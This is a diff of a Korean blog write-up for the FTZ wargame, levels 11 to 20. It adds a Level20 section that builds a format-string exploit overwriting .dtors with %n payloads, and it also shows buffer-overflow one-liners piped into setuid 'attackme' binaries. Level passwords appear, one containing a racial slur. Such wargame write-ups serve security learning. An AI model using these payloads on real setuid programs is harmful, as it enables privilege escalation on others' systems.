@@ -3,6 +3,7 @@ layout: post
 title:  "FTZ-Writeup"
 tag:   Analysis
 categories: pwnable
+categories: persu
 ---
 
 FTZ-Writeup
@@ -13,8 +14,11 @@ FTZ-Writeup
 
 ### 1. Directory info
 -rwsr-x---    1 level12  level11     13733  3월  8  2003 attackme
+
 -rw-r-----    1 root     level11       168  3월  8  2003 hint
+
 drwxr-xr-x    2 root     level11      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level11      4096  2월 19 16:37 tmp
 
 attackme 라는 바이너리를 실행하여, BoF 공격을 해야 한다.
@@ -186,8 +190,11 @@ exploit code는 위와 같으며, little 엔디안 방식으로 eggshell 주소�
 
 ### 1. Directory info
 -rwsr-x---    1 level13  level12     13771  3월  8  2003 attackme
+
 -rw-r-----    1 root     level12       204  3월  8  2003 hint
+
 drwxr-xr-x    2 root     level12      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level12      4096  2월 19 17:26 tmp
 
 attackme 라는 바이너리를 실행하여, BoF 공격을 해야 한다.
@@ -263,6 +270,7 @@ eggshell은 실행마다 getenv 주소가 바뀌게 된다. 따라서 EGG 환경
 
 ### 5. exploit
 (python -c 'print "A"*268+"\x7d\xf4\xff\xbf"';cat) | /home/level12/attackme
+
 Level13 Password is "have no clue".
 
 표준입력을 인자로 받는 gets함수는 () | 를 통해 인자값을 넣어줘야 한다.
@@ -271,8 +279,11 @@ Level13 Password is "have no clue".
 
 ### 1. Directory info
 -rwsr-x---    1 level14  level13     13953  3월  8  2003 attackme
+
 -rw-r-----    1 root     level13       258  3월  8  2003 hint
+
 drwxr-xr-x    2 root     level13      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level13      4096  1월 11  2009 tmp
 
 
@@ -364,8 +375,11 @@ Level14 Password is "what that nigga want?".
 ### 1. Directory info
 
 -rwsr-x---    1 level15  level14     13801 12월 10  2002 attackme
+
 -rw-r-----    1 root     level14       346 12월 10  2002 hint
+
 drwxr-xr-x    2 root     level14      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level14      4096  1월 11  2009 tmp
 
 ### 2. hint
@@ -437,8 +451,11 @@ Level15 Password is "guess what".
 
 ### 1. Directory info
 -rwsr-x---    1 level16  level15     13801 12월 10  2002 attackme
+
 -rw-r-----    1 root     level15       185 12월 10  2002 hint
+
 drwxr-xr-x    2 root     level15      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level15      4096  1월 11  2009 tmp
 
 ### 2. hint
@@ -515,9 +532,13 @@ Level16 Password is "about to cause mass".
 
 ### 1. Directory info
 -rwsr-x---    1 level17  level16     14017  3월  8  2003 attackme
+
 -rw-r-----    1 root     root          235  3월  8  2003 attackme.c
+
 -rw-r-----    1 root     level16       235  3월  8  2003 hint
+
 drwxr-xr-x    2 root     level16      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level16      4096  1월 11  2009 tmp
 
 ### 2. hint
@@ -598,8 +619,11 @@ Level17 Password is "king poetic".
 
 ### 1. Directory info
 -rwsr-x---    1 level18  level17     13853  3월  8  2003 attackme
+
 -rw-r-----    1 root     level17       191  3월  8  2003 hint
+
 drwxr-xr-x    2 root     level17      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level17      4096  1월 11  2009 tmp
 
 ### 2. hint
@@ -754,8 +778,11 @@ Level19 Password is "swimming in pink".
 
 ### 1. Directory info
 -rwsr-x---    1 level20  level19     13615  3월  8  2003 attackme
+
 -rw-r-----    1 root     level19        65  3월  8  2003 hint
+
 drwxr-xr-x    2 root     level19      4096  2월 24  2002 public_html
+
 drwxrwxr-x    2 root     level19      4096  1월 16  2009 tmp
 
 ### 2. hint
@@ -800,3 +827,97 @@ uid=3100(level20) gid=3099(level19) groups=3099(level19)
 my-pass
 TERM environment variable not set.
 Level20 Password is "we are just regular guys".
+
+
+## Level20
+
+### 1. Directory info
+-rwsr-sr-x    1 clear    clear       11777  6월 18  2008 attackme
+
+-rw-r-----    1 root     level20       133  5월 13  2002 hint
+
+drwxr-xr-x    2 root     level20      4096  2월 24  2002 public_html
+
+drwxrwxr-x    2 root     level20      4096  2월 20 11:40 tmp
+
+### 2. hint
+```c
+#include <stdio.h>
+main(int argc,char **argv)
+{ char bleh[80];
+  setreuid(3101,3101);
+  fgets(bleh,79,stdin);
+  printf(bleh);
+}
+```
+
+### 3. gdb attackme
+이번 문제는 포맷 스트링을 통해 문제를 해결해야 한다.
+포맷 스트링은
+```
+%x  부호 없는 16진수
+%n  쓰인 총 바이트 수
+```
+위 두 포맷 스트링에 대해서 알고 있어야 한다.
+hint 에서 보듯 printf(bleh)에는 포맷 스트링이 없기 때문에 아래와 같이 입력 시 주소 출력이 가능하다.
+
+```
+[level20@ftz level20]$ ./attackme
+AAAA %x %x %x %x %x
+AAAA 4f 4212ecc0 4207a750 41414141 20782520
+```
+
+AAAA를 입력하고 이후에는 주소 값을 보여지게 된다.
+
+```
+[level20@ftz level20]$ ./attackme
+AAAAAAAAAAAA %x %x %x %x %x %x %x
+AAAAAAAAAAAA 4f 4212ecc0 4207a750 41414141 41414141 41414141 20782520
+````
+A를 12개 입력하면 A*12 값이 출력되고 이후 12byte 뒤에 다시 4141로 A가 출력된다.
+즉 스택은 아래와 같은 구성이 될 것이다.
+```
+printf(bleh)  = AAAAAAAAAAAA
+dummy         = 0000004f
+                4212ecc0
+				4207a750
+
+char bleh[80] = 41414141
+                41414141
+		        41414141
+				20782520
+
+dummy         = ?
+SFP           = 4byte
+RET           = 4byte
+```
+뭐 이런 형식이 아닐까?
+
+```
+[level20@ftz level20]$ objdump -h attackme |grep .dtors
+ 18 .dtors        00000008  08049594  08049594  00000594  2**2
+```
+
+
+### 4. exploit code
+1. base exploit code
+egg : 0xbffff46e
+bfff : 49151
+f46e : 62574
+AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62574c%n%49151c%n
+
+2.
+AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x
+4 + 4+ 4+ 4 +8 + 8+ 8  = 16 + 24 = 40
+62574-40 = 62534
+AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62174c%n%49151c%n
+
+3.
+1bfff = 114687 - 62574 = 52113
+AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62174c%n%52113c%n
+
+
+(python -c 'print "AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62534c%n%52113c%n"';cat) | /home/level20/attackme
+
+AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62534c%n%52113c%n
+AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%62085c%n%52562c%n
